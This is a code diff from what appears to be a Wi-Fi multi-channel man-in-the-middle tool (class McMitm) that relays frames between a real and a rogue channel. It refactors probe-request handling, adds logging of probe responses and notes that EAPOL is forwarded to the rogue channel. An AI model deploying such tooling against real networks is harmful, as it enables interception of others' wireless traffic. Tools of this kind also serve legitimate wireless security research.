@@ -54,7 +54,7 @@ bool McMitm::is_eapol(const PDU &pdu){
     return pdu.find_pdu<EAPOL>() != nullptr;
 }
 
-bool McMitm::handle_probe_request_real(const Dot11 &dot11) const{
+bool McMitm::handle_probe_request_real(const HWAddress<6> addr2, const Dot11 &dot11) const{
     if(dot11.find_pdu<Dot11ProbeRequest>()){
         probe_resp->addr1(dot11.find_pdu<Dot11ProbeRequest>()->addr2());
         RadioTap rt;
@@ -62,6 +62,10 @@ bool McMitm::handle_probe_request_real(const Dot11 &dot11) const{
         sock_real->send(rt, netconfig.real_channel);
         display_client_traffic(dot11, "Real channel", " -- Replied");
         return true;
+    }
+    if(dot11.find_pdu<Dot11ProbeResponse>()){
+        if(addr2 != ap_mac) print_rx(LogLevel::INFO, "Real channel", dot11);
+        //return true;
     }
     return false;
 }
@@ -98,9 +102,9 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu){
         return;
     }
 
-    if(dot11->find_pdu<Dot11ProbeRequest>()){
-        handle_probe_request_real(*dot11);
-    } else if(dot11->addr1() == ap_mac){
+    if (handle_probe_request_real(addr2, *dot11)) return;
+
+    if(dot11->addr1() == ap_mac){ // STA -> AP
         if(const auto *auth = dot11->find_pdu<Dot11Authentication>())
             handle_auth_from_client_real(*auth);
         else if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>()){
@@ -126,7 +130,7 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu){
                 sock_real->send(null_frame, netconfig.real_channel);
             }
         }
-    } else if(addr2 == ap_mac){
+    } else if(addr2 == ap_mac){ // AP -> STA
         handle_from_ap_real(pdu, *dot11, addr1);
 
         // EAPOL od AP → forward na rogue channel
